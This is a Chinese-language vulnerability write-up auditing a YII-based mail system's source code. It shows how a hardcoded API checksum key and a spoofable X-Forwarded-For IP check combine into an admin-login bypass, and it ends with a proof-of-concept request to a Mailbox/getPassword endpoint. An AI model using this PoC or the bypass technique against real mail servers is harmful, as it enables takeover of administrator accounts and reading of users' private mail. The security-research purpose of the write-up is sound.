## **0x00 前言**

近期拿到了某邮件系统的一套源码，看到是YII框架编写的，本着学习YII框架出发，顺带对该套系统进行了审计。

## **0x01 YII框架路由初识**

YII框架支持两种URL构造格式，分别为默认的格式和漂亮格式，漂亮格式使用额外的路径跟在入口脚本名之后，来展现路由和相关参数，默认格式`/index.php?r=post/view&id=100` 的路由为`post/view`和参数id为100，使用漂亮格式则简化成`/index.php/post/100`。

![](../Images/a243a07c6f8327a7558b64f4286ec516.png)

YII框架使用MVC模式进行开发，如果不了解MVC模式可以参考链接，不再赘述：https://www.yiichina.com/doc/guide/1.1/basics.mvc

想访问API目录下的controller 目录中的`abccontroller.php`内的`public function add()`方法，可如下构造

http://127.0.0.1/api/index.php?r=abc/add

## **0x02 漏洞挖掘-任意登录**

在api/controllers/PostController.php中存在一个模拟登陆方法：

```
1.  `public function mockLogin() {`
    
2.  `   $language = $this->getParamFromRequest( "language" );`
    
3.  `   $name = $this->getParamFromRequest( 'domain' );`
    
4.  `   if (isset( $name )  && isset( $language )) {`
    
5.  `      $username = "admin";`
    
6.  `      if (! in_array( $language, array ("cn", "tw", "en" ) )) {`
    
7.  `         $this->returnErrorCode( CommonCode::COMMON_PARAM_ERROR, array ('{0}' => 'language' ) );`
    
8.  `      }`
    
9.  `      if (! ParameterChecker::checkLength( $name, Constants::DOMAIN_NAME_MAX_LENGTH )) {`
    
10.  `         $this->returnErrorCode( CommonCode::COMMON_DOMAIN_LENGTH_WRONG );`
     
11.  `      }`
     
12.  `      $domain = ServiceFactory::getDomainService()->getDomainByName( PunyCode::encode( strtolower( $name ) ) );`
     
13.  `      if ($domain == null) {`
     
14.  `         $this->returnErrorCode( CommonCode::COMMON_DOMAIN_IS_NOT_EXISTS );`
     
15.  `      }`
     
16.  `      $domainName = PunyCode::encode( $name );`
     
17.  `      $password = (empty($domain))?"":$domain["po_pwd"];`
     
18.  `      $otime = time();`
     
19.  `      $sysflag = 'sysmanage';`
     
20.  `      $checksum = md5( $sysflag . $username . $domainName . $password. $language . time() . Config::MONI_CHECKSUM_KEY );`
     
21.  `      $url = "http://" . ClientUtils::getHttpHost() . "/post/post.php?r=site/analogLogin&sysflag=$sysflag&lan=$language&domain=$domainName&username=$username&checksum=$checksum&otime=$otime";`
     
22.  `      header( "location:$url" );`
     
23.  `   } else {`
     
24.  `      $this->returnErrorCode( CommonCode::COMMON_PARAM_INCOMPLETE );`
     
25.  `   }`
     
26.  `}`
     
```

![](../Images/aed0a3e0561b99ad5f3aee9db04d8d19.png)

获取参数language和domain确定语言与域,传入 经过校验以后与`po_pwd`、`MONI_CHECKSUM_KEY`等结合起来构造校验的$checksum，成功进行登录。该接口需要验证，直接构造无法通过验证。

接下来跟到上文中提到的验证的位置，该位置为所有API方法调用时必须校验的方法：

api/classes/ApiController.php

```
1.  `private function checkServerTypeParams() {`
    
2.  `   if (! in_array( ClientUtils::getClientIP(), Config::getApiAllowUserIps() )) {`
    
3.  `      $this->returnErrorCode( CommonCode::COMMON_ILLEGAL_IP_SOURCE );`
    
4.  `   }`
    
5.  `   $id = $this->getParamFromRequest( 'id' );`
    
6.  `   $time = $this->getParamFromRequest( 'otime' );`
    
7.  `   if (! ParameterChecker::checkLength( $time, 20 )) {`
    
8.  `      $this->returnErrorCode( CommonCode::COMMON_ILLEGAL_CHECK_PARAM );`
    
9.  `   }`
    
10.  `   if (! ParameterChecker::checkIsDate( $time )) {`
     
11.  `      $this->returnErrorCode( CommonCode::COMMON_ILLEGAL_CHECK_PARAM );`
     
12.  `   }`
     
13.  `   $checkSum = $this->getParamFromRequest( 'ochecksum' );`
     
14.  `   if (! ParameterChecker::checkLength( $checkSum, 32 )) {`
     
15.  `      $this->returnErrorCode( CommonCode::COMMON_ILLEGAL_CHECK_PARAM );`
     
16.  `   }`
     
17.  `   $md5String = md5( $id . $time . Config::API_CHECKSUM_KEY );`
     
18.  `   if ($md5String != $checkSum) {`
     
19.  `      $this->returnErrorCode( CommonCode::COMMON_ILLEGAL_CHECKSUM );`
     
20.  `   }`
     
21.  `}`
     
```

![](../Images/d06941a0246400afa25d0429fc2450e4.png)

可以看到该接口需要获取IP，并且与可允许的IP进行匹配，如果为同一个IP则进入该方法。进入该验证方法以后前端传入`ID`,`OTIME`与`ONCHECKSUM`进行验证，其中ID为固定ID，为模拟登陆模式，time为日期形式可以是随便一个日期只要符合条件就行，`ONCHECKSUM`则与`ID`,`OTIME`和`API_CHECKSUM_KEY`三者拼接起来的md5校验是否一致，最终校验通过以后验证通过，可以执行后续方法。

如图为ID固定ID：

![](../Images/c6ad8daedf2c28513968733ab9e6587a.png)

加密时需要一个`API_CHECKSUM_KEY`,全局搜索发现该key同样硬件key：

![](../Images/ee5b5b9ccf346b3880fa7f837a3d1ab3.png)

所以`ONCHECKSUM`成功可以构造。但是需要进入`checkServerTypeParams`方法，仍需要验证IP，我们跟一下`getApiAllowUserIps`，发现可以被绕过:

![](../Images/510da12328d93034bab146bb6d5d62b6.png)

看到了熟悉的获取`x-forwarded-for`，可以实现伪造，在看`$realip`的定义，直接固定ip写在代码里：

![](../Images/aa701bc1b2efe55a6cc81a1e8e84a2ae.png)

可以利用插件X-Forwarded-For Header伪造`x-forwarded-for`：

![](../Images/38801a838f70eb19495df0a1ea4669ac.png)

结合以上所有点最终能够实现模拟登陆的功能

poc:

```
1.  `http://mail.a.com/api/index.php?r=Mailbox/getPassword`
    
2.  
    1.  `id=cm&otime=2021-03-11&ochecksum=083d71127d5ad99f8907358db2c8320a&language=cn&domain=a.com&mailbox=admin@a.com`
    
```

登录管理员后，可查看所有人邮件内容、邮箱信息等等
